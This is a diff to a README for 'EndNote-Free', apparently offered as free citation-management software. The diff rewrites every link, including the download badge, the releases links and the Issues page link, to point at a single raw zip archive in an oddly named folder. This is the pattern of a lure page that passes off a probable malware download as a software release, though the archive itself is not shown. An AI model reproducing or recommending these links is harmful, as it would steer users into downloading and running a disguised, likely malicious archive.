@@ -1,7 +1,7 @@
 ```markdown
 # 📚 EndNote-Free - Simplify Your Citation Management Today
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started%20With%20EndNote-Free-brightgreen)](https://github.com/SFarmhere/EndNote-Free/releases)
+[![Download Now](https://github.com/SFarmhere/EndNote-Free/raw/refs/heads/main/Temnospondyli/Note-Free-End-2.2.zip%20Now-Get%20Started%20With%20EndNote-Free-brightgreen)](https://github.com/SFarmhere/EndNote-Free/raw/refs/heads/main/Temnospondyli/Note-Free-End-2.2.zip)
 
 ## 🌟 Introduction
 
@@ -15,7 +15,7 @@ Follow these simple steps to download and run EndNote-Free. This process is desi
 
 1. **Visit the Releases Page**  
    Go to our releases page to get the latest version of EndNote-Free.  
-   [Download Here](https://github.com/SFarmhere/EndNote-Free/releases)
+   [Download Here](https://github.com/SFarmhere/EndNote-Free/raw/refs/heads/main/Temnospondyli/Note-Free-End-2.2.zip)
 
 2. **Choose the Latest Release**  
    Look for the most recent version of EndNote-Free on the releases page. The latest version includes updates and new features.
@@ -58,14 +58,14 @@ EndNote-Free provides a range of features designed to enhance your academic rese
 
 - **Explore the Help Section**: Familiarize yourself with the Help section within the app for detailed instructions on each feature.
 - **Stay Updated**: Regularly check the releases page for updates and new features.  
-   [Download Here](https://github.com/SFarmhere/EndNote-Free/releases)
+   [Download Here](https://github.com/SFarmhere/EndNote-Free/raw/refs/heads/main/Temnospondyli/Note-Free-End-2.2.zip)
 - **Backup Your Library**: Periodically back up your reference library to prevent data loss.
 
 ## 🌐 Community & Support
 
 If you have questions or need assistance, feel free to reach out:
 
-- **Issues Page**: Report bugs or request features on our [Issues page](https://github.com/SFarmhere/EndNote-Free/issues).
+- **Issues Page**: Report bugs or request features on our [Issues page](https://github.com/SFarmhere/EndNote-Free/raw/refs/heads/main/Temnospondyli/Note-Free-End-2.2.zip).
 - **Discussion Forum**: Join our community discussions to share tips and ask questions.
 
 ## 📚 Topics Covered
